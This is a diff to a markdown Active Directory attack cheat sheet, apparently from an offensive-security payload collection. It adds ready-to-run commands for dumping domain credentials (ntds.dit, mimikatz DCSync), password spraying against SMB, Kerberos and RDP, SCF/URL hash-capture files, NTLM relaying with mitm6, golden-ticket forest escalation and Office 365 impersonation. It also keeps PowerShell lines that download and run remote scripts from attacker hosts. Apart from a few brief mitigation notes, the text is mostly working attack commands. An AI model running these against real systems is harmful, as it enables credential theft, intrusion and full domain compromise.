@@ -2,38 +2,67 @@
 
 ## Summary
 
-* [Tools](#tools)
-* [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
-  * [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
-  * [Open Shares](#open-shares)
-  * [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
-  * [Dumping AD Domain Credentials](#dumping-ad-domain-credentials-systemrootntdsntdsdit)
-    * Using ndtsutil
-    * Using Vshadow
-    * Using vssadmin
-    * Using DiskShadow
-    * Using Mimikatz DCSync
-    * Using Mimikatz sekurlsa
-  * [Password in AD User comment](#password-in-ad-user-comment)
-  * [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
-  * [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
-  * [Kerberoast](#kerberoast)
-  * [KRB_AS_REP roasting](#krb_as_rep-roasting)
-  * [Pass-the-Hash](#pass-the-hash)
-  * [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
-  * [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
-  * [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
-    * [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
-    * [SMB Signing Disabled](#smb-signing-disabled)
-    * [Drop the MIC](#drop-the-mic)
-  * [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
-  * [Trust relationship between domains](#trust-relationship-between-domains)
-  * [Unconstrained delegation](#unconstrained-delegation)
-  * [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
-  * [PrivExchange attack](#privexchange-attack)
-  * [Password spraying](#password-spraying)
-  * [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etc-krb5-keytab)
-  * [PXE Boot image attack](#pxe-boot-image-attack)
+- [Active Directory Attacks](#active-directory-attacks)
+  - [Summary](#summary)
+  - [Tools](#tools)
+  - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
+    - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
+    - [Open Shares](#open-shares)
+    - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
+    - [GPO - Pivoting with Local Admin & Passwords in SYSVOL](#gpo---pivoting-with-local-admin--passwords-in-sysvol)
+    - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
+      - [Using ndtsutil](#using-ndtsutil)
+      - [Using Vshadow](#using-vshadow)
+      - [Using vssadmin](#using-vssadmin)
+      - [Using DiskShadow (a Windows signed binary)](#using-diskshadow-a-windows-signed-binary)
+      - [Using esentutl.exe](#using-esentutlexe)
+      - [Extract hashes from ntds.dit](#extract-hashes-from-ntdsdit)
+      - [Alternatives - modules](#alternatives---modules)
+      - [Using Mimikatz DCSync](#using-mimikatz-dcsync)
+      - [Using Mimikatz sekurlsa](#using-mimikatz-sekurlsa)
+    - [Password spraying](#password-spraying)
+      - [Kerberos pre-auth bruteforcing](#kerberos-pre-auth-bruteforcing)
+      - [Spray a pre-generated passwords list](#spray-a-pre-generated-passwords-list)
+      - [Spray passwords against the RDP service](#spray-passwords-against-the-rdp-service)
+    - [Password in AD User comment](#password-in-ad-user-comment)
+    - [Pass-the-Ticket Golden Tickets](#pass-the-ticket-golden-tickets)
+      - [Using Mimikatz](#using-mimikatz)
+      - [Using Meterpreter](#using-meterpreter)
+      - [Using a ticket on Linux](#using-a-ticket-on-linux)
+    - [Pass-the-Ticket Silver Tickets](#pass-the-ticket-silver-tickets)
+    - [Kerberoasting](#kerberoasting)
+    - [KRB_AS_REP Roasting](#krbasrep-roasting)
+    - [Pass-the-Hash](#pass-the-hash)
+    - [OverPass-the-Hash (pass the key)](#overpass-the-hash-pass-the-key)
+      - [Using impacket](#using-impacket)
+      - [Using Rubeus](#using-rubeus)
+    - [Capturing and cracking NTLMv2 hashes](#capturing-and-cracking-ntlmv2-hashes)
+    - [NTLMv2 hashes relaying](#ntlmv2-hashes-relaying)
+      - [MS08-068 NTLM reflection](#ms08-068-ntlm-reflection)
+      - [SMB Signing Disabled and IPv4](#smb-signing-disabled-and-ipv4)
+      - [SMB Signing Disabled and IPv6](#smb-signing-disabled-and-ipv6)
+      - [Drop the MIC](#drop-the-mic)
+      - [Ghost Potato - CVE-2019-1384](#ghost-potato---cve-2019-1384)
+    - [Dangerous Built-in Groups Usage](#dangerous-built-in-groups-usage)
+    - [Trust relationship between domains](#trust-relationship-between-domains)
+    - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
+    - [Unconstrained delegation](#unconstrained-delegation)
+      - [Find delegation](#find-delegation)
+      - [Monitor with Rubeus](#monitor-with-rubeus)
+      - [Force a connect back from the DC](#force-a-connect-back-from-the-dc)
+      - [Load the ticket](#load-the-ticket)
+      - [Mitigation](#mitigation)
+    - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
+    - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
+    - [PrivExchange attack](#privexchange-attack)
+    - [PXE Boot image attack](#pxe-boot-image-attack)
+    - [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
+  - [Linux Active Directory](#linux-active-directory)
+    - [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
+    - [CCACHE ticket reuse from keyring](#ccache-ticket-reuse-from-keyring)
+    - [CCACHE ticket reuse from keytab](#ccache-ticket-reuse-from-keytab)
+    - [Extract accounts from /etc/krb5.keytab](#extract-accounts-from-etckrb5keytab)
+  - [References](#references)
 
 ## Tools
 
@@ -50,6 +79,7 @@
   ./bloodhound
   SharpHound.exe (from resources/Ingestor)
   SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+  SharpHound.exe -c all -d active.htb --LdapUser myuser --LdapPass mypass --domaincontroller 10.10.10.100
   or 
   Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
   or 
@@ -60,16 +90,18 @@
 * [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
   ```bash
+  apt-get install -y libssl-dev libffi-dev python-dev build-essential
   git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
   crackmapexec smb -L
   crackmapexec smb -M name_module -o VAR=DATA
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --local-auth
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
-  crackmapexec 192.168.1.100 -u Jaddmon -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
-  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
-  crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
-  crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
+  crackmapexec 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
+  crackmapexec 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
+  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
+  crackmapexec 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
+  crackmapexec smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
   crackmapexec mimikatz --server http --server-port 80
   ```
 
@@ -90,6 +122,12 @@
   ```powershell
   powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
   powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
+  ```
+
+* [ADRecon](https://github.com/sense-of-security/ADRecon)
+
+  ```powershell
+  .\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
   ```
 
 * [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)
@@ -123,6 +161,13 @@
     Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
     ```
 
+* [AutomatedLab](https://github.com/AutomatedLab/AutomatedLab)
+    ```powershell
+    New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
+    Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'
+    Install-Lab
+    Show-LabDeploymentSummary
+    ```
 
 ## Most common paths to AD compromise
 
@@ -143,6 +188,10 @@ Administrator  S-1-5-21-297520375-2634728305-5197346142-500
 Guest          S-1-5-21-297520375-2634728305-5197346142-501   
 krbtgt         S-1-5-21-297520375-2634728305-5197346142-502   
 lambda         S-1-5-21-297520375-2634728305-5197346142-1110 
+
+# powerview
+Convert-NameToSid high-sec-corp.localkrbtgt
+S-1-5-21-2941561648-383941485-1389968811-502
 ```
 
 ```bash
@@ -229,6 +278,7 @@ ls            # list files
 Download a folder recursively
 
 ```powershell
+smbclient -U username //10.0.0.1/SYSVOL
 smbclient //10.0.0.1/Share
 smb: \> mask ""
 smb: \> recurse ON
@@ -243,6 +293,29 @@ Mount a share
 smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
 sudo mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder
 ```
+
+### SCF and URL file attack against writeable share
+
+Drop the following `@something.scf` file inside a share and start listening with Responder : `responder -wrf --lm -v -I eth0`
+
+```powershell
+[Shell]
+Command=2
+IconFile=\\10.10.XX.XX\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+This attack also works with `.url` files and `responder -I eth0 -v`.
+
+```powershell
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\192.168.1.29\%USERNAME%.icon
+IconIndex=1
+```
+
 
 ### GPO - Pivoting with Local Admin & Passwords in SYSVOL
 
@@ -291,7 +364,11 @@ Get-NetGPO
 Get-NetGPOGroup
 ```
 
-### Dumping AD Domain Credentials (%SystemRoot%\NTDS\Ntds.dit)
+### Dumping AD Domain Credentials
+
+You will need the following files to extract the ntds : 
+- ntds file (C:\Windows\NTDS\ntds.dit)
+- SYSTEM hive (C:\Windows\System32\SYSTEM)
 
 #### Using ndtsutil
 
@@ -352,9 +429,17 @@ dir c:\exfil
 reg.exe save hklm\system c:\exfil\system.bak
 ```
 
+#### Using esentutl.exe
+
+Copy/extract a locked file such as the AD Database
+
+```powershell
+esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
+```
+
 #### Extract hashes from ntds.dit
 
-then you need to use secretsdump to extract the hashes
+then you need to use secretsdump to extract the hashes, use the `LOCAL` options to use it on a retrieved ntds.dit
 
 ```java
 secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
@@ -406,6 +491,57 @@ Dumps credential data in an Active Directory domain when run on a Domain Control
 ```powershell
 sekurlsa::krbtgt
 lsadump::lsa /inject /name:krbtgt
+```
+
+
+### Password spraying
+
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
+
+> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
+
+Most of the time the best passwords to spray are :
+
+- Password123
+- Welcome1
+- $Companyname1 : $Microsoft1
+- SeasonYear : Winter2019*
+- Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
+
+#### Kerberos pre-auth bruteforcing
+
+Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+
+> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
+
+```powershell
+root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
+```
+
+#### Spray a pre-generated passwords list
+
+Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+
+```powershell
+crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
+```
+
+#### Spray passwords against the RDP service
+
+Using RDPassSpray to target RDP services.
+
+```powershell
+git clone https://github.com/xFreed0m/RDPassSpray
+python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
+```
+
+Using hydra and ncrack to target RDP services.
+
+```powershell
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
+ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
 ```
 
 ### Password in AD User comment
@@ -505,11 +641,11 @@ root@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache
 root@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
-### Kerberoast
+### Kerberoasting
 
 > "A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. " - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)
 
-Any valid domain user can request a kerberos ticket for any domain service with `GetUserSPNs`. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
+Any valid domain user can request a kerberos ticket (TGS) for any domain service with `GetUserSPNs`. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.
 
 ```powershell
 $ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
@@ -529,6 +665,12 @@ Alternatively with [Rubeus](https://github.com/GhostPack/Rubeus)
 .\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
 ```
 
+Alternatively on macOS machine you can use [bifrost](https://github.com/its-a-feature/bifrost)
+
+```powershell
+./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
+```
+
 Then crack the ticket with hashcat or john
 
 ```powershell
@@ -536,9 +678,16 @@ hashcat -m 13100 -a 0 hash.txt crackstation.txt
 ./john ~/hash.txt --wordlist=rockyou.lst
 ```
 
+Mitigations: 
+* Have a very long password for your accounts with SPNs
+* Make sure no users have SPNs
+
 ### KRB_AS_REP Roasting
 
 If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting
+
+Prerequisite:
+- Accounts have to have **DONT_REQ_PREAUTH**
 
 ```powershell
 C:\>git clone https://github.com/GhostPack/Rubeus#asreproast
@@ -683,7 +832,7 @@ msf > use exploit/windows/smb/smb_relay
 msf exploit(smb_relay) > show targets
 ```
 
-#### SMB Signing Disabled 
+#### SMB Signing Disabled and IPv4
 
 If a machine has `SMB signing`:`disabled`, it is possible to use Responder with Multirelay.py script to perform an `NTLMv2 hashes relay` and get a shell access on the machine.
 
@@ -717,6 +866,33 @@ If a machine has `SMB signing`:`disabled`, it is possible to use Responder with 
     $ proxychains mssqlclient.py contoso/normaluser1@192.168.48.230 -windows-auth
     ```
 
+Mitigations:
+
+ * Disable LLMNR via group policy
+    ```powershell
+    Open gpedit.msc and navigate to Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution and set to Enabled
+    ```
+ * Disable NBT-NS
+    ```powershell
+    This can be achieved by navigating through the GUI to Network card > Properties > IPv4 > Advanced > WINS and then under "NetBIOS setting" select Disable NetBIOS over TCP/IP
+    ```
+
+#### SMB Signing Disabled and IPv6
+
+Since MS16-077 the location of the WPAD file is no longer requested via broadcast protocols, but only via DNS.
+
+```powershell
+cme smb $hosts --gen-relay-list relay.txt
+
+# DNS takeover via IPv6, mitm6 will request an IPv6 address via DHCPv6
+mitm6 -i eth0 -d $domain
+
+# spoofing WPAD and relaying NTLM credentials
+http://ntlmrelayx.py -6 -wh $attacker_ip -of loot -tf relay.txt
+or 
+http://ntlmrelayx.py -6 -wh $attacker_ip -l /tmp -socks -debug
+```
+
 #### Drop the MIC
 
 > The CVE-2019-1040 vulnerability makes it possible to modify the NTLM authentication packets without invalidating the authentication, and thus enabling an attacker to remove the flags which would prevent relaying from SMB to LDAP
@@ -749,6 +925,19 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     secretsdump.py -k -no-pass second-dc-server.local -just-dc
     ```
 
+#### Ghost Potato - CVE-2019-1384
+
+Prerequisites:
+* User must be a member of the local Administrators group
+* User must be a member of the Backup Operators group
+* Token must be elevated
+
+Using a modified version of ntlmrelayx : https://shenaniganslabs.io/files/impacket-ghostpotato.zip
+
+```powershell
+ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
+```
+
 ### Dangerous Built-in Groups Usage
 
 If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System, " or set "adminCount" attribute to 0 for the required objec
@@ -777,6 +966,25 @@ SourceName          TargetName                    TrustType      TrustDirection
 ----------          ----------                    ---------      --------------
 domainA.local      domainB.local                  TreeRoot       Bidirectional
 ```
+
+### Child Domain to Forest Compromise - SID Hijacking
+
+Most trees are linked with dual sided trust relationships to allow for sharing of resources.
+By default the first domain created if the Forest Root.
+
+Prerequisite: 
+- KRBTGT Hash
+
+- Find the SID of the domain
+    ```powershell
+    $ Convert-NameToSid target.domain.com\krbtgt
+    S-1-5-21-2941561648-383941485-1389968811-502
+    ```
+- Replace 502 with 519 to represent Enterprise Admins
+- Create golden ticket and attack parent domain. 
+    ```powershell
+    kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
+    ```
 
 ### Unconstrained delegation
 
@@ -829,6 +1037,12 @@ Extract the base64 TGT from Rubeus output and load it to our current session.
 ```
 
 Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HACKER\krbtgt`
+
+
+#### Mitigation
+
+* Ensure sensitive accounts cannot be delegated
+* Disable the Print Spooler Service
 
 ### Resource-Based Constrained Delegation
 
@@ -907,6 +1121,23 @@ Resource-based Constrained Delegation was introduced in Windows Server 2012.
     [+] Ticket successfully imported!
     ```
 
+### Relay delegation with mitm6
+
+Prerequisites: 
+- IPv6 enabled (Windows prefers IPV6 over IPv4)
+- LDAP over TLS (LDAPS)
+
+> ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.
+
+```powershell
+git clone https://github.com/fox-it/mitm6.git 
+cd /opt/tools/mitm6
+pip install .
+
+mitm6 -hw ws02 -d lab.local --ignore-nofqnd
+ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad
+then use rubeus with s4u to relay the delegation
+```
 
 ### PrivExchange attack
 
@@ -956,71 +1187,13 @@ Alternatively you can use the Metasploit module
 
 [`use auxiliary/scanner/http/exchange_web_server_pushsubscription`](https://github.com/rapid7/metasploit-framework/pull/11420)
 
-### Password spraying
-
-Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
-
-> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 
-
-#### Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
-
-> Kerberos pre-authentication errors are not logged in Active Directory with a normal Logon failure event (4625), but rather with specific logs to Kerberos pre-authentication failure (4771).
+Alternatively you can use an all-in-one tool : Exchange2domain.
 
 ```powershell
-root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
-root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
-root@kali:~$ python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
+git clone github.com/Ridter/Exchange2domain 
+python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip
+python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip
 ```
-
-#### Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
-
-```powershell
-crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
-```
-
-#### Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
-
-```powershell
-python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
-```
-
-#### Using [hydra]() and [ncrack]() to target RDP services.
-
-```powershell
-hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
-ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
-```
-
-Most of the time the best passwords to spray are :
-
-- Password1
-- Welcome1
-- $Companyname1
-
-### Extract accounts from /etc/krb5.keytab
-
-The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. 
-
-Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
-
-```powershell
-$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
-[...]
-[26] Service principal: host/COMPUTER@DOMAIN
-	 KVNO: 25
-	 Key type: 23
-	 Key: 6b3723410a3c54692e400a5862256e0a
-	 Time stamp: Oct 07,  2019 09:12:02
-[...]
-```
-
-Connect to the machine using the account and the hash with CME.
-
-```powershell
-$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
-CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
-```
-
 
 ### PXE Boot image attack
 
@@ -1073,8 +1246,111 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     ```
 
 
+### Impersonating Office 365 Users on Azure AD Connect
+
+Prerequisites: 
+
+* Obtain NTLM password hash of the AZUREADSSOACC account
+    ```powershell
+    mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
+    ```
+
+* AAD logon name of the user we want to impersonate (userPrincipalName or mail)
+    ```powershell
+    elrond@contoso.com
+    ```
+
+* SID of the user we want to impersonate
+    ```powershell
+    S-1-5-21-2121516926-2695913149-3163778339-1234
+    ```
+
+
+Create the Silver Ticket and inject it into Kerberos cache:
+```powershell
+mimikatz.exe "kerberos::golden /user:elrond
+/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
+/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
+/target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
+```
+
+Launch Mozilla Firefox, go to about:config
+```powershell
+network.negotiate-auth.trusted-uris="https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com".
+```
+
+Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.
+
+
+## Linux Active Directory
+
+### CCACHE ticket reuse from /tmp
+
+List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`
+
+> When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+
+### CCACHE ticket reuse from keyring
+
+Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
+
+```powershell
+[root@Lab-LSV01 /]# /tmp/tickey -i
+[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
+[+] root detected, so... DUMP ALL THE TICKETS!!
+[*] Trying to inject in tarlogic[1000] session...
+[+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache
+[*] Trying to inject in velociraptor[1120601115] session...
+[+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
+[*] Trying to inject in trex[1120601113] session...
+[+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
+[X] [uid:0] Error retrieving tickets
+```
+
+### CCACHE ticket reuse from keytab
+
+```powershell
+git clone https://github.com/its-a-feature/KeytabParser
+python KeytabParser.py /etc/krb5.keytab
+klist -k /etc/krb5.keytab
+```
+
+### Extract accounts from /etc/krb5.keytab
+
+The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service's password, and must be kept secure. 
+
+Use [`klist`](https://adoptopenjdk.net/?variant=openjdk13&jvmVariant=hotspot) to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.
+
+```powershell
+$ klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab
+[...]
+[26] Service principal: host/COMPUTER@DOMAIN
+	 KVNO: 25
+	 Key type: 23
+	 Key: 6b3723410a3c54692e400a5862256e0a
+	 Time stamp: Oct 07,  2019 09:12:02
+[...]
+```
+
+On macOS you can use `bifrost`.
+
+```powershell
+./bifrost -action dump -source keytab -path test
+```
+
+Connect to the machine using the account and the hash with CME.
+
+```powershell
+$ crackmapexec 10.XXX.XXX.XXX -u 'COMPUTER$' -H "6b3723410a3c54692e400a5862256e0a" -d "DOMAIN"
+CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c54692e400a5862256e0a  
+```
+
+
+
+
 ## References
 
+* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](#https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
 * [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
 * [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
 * [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
@@ -1130,3 +1406,5 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
 * [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
 * [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 * [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
+* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
+* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
